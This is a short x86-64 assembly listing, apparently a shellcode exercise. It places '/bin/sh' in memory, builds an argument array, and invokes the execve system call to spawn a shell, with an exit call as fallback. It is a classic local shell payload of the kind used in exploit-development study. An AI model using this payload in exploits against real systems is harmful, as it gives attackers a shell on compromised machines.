global _start
section .text
	
_start: 
	jmp l1
	str2: db "/bin/sh"
l1:
	xor rax,rax
	lea rdi,[rel str2]
	mov [rdi+7], byte al
	mov [rdi+8], rdi
	mov [rdi+16],rax
	
	lea rsi,[rdi+8]
	lea rdx,[rdi+16]
	
	xor rax,rax
	add rax,59
	syscall
	
	;Should not hit this exit
	xor rax,rax
	mov rdi,rax
	mov al,60
	syscall

	
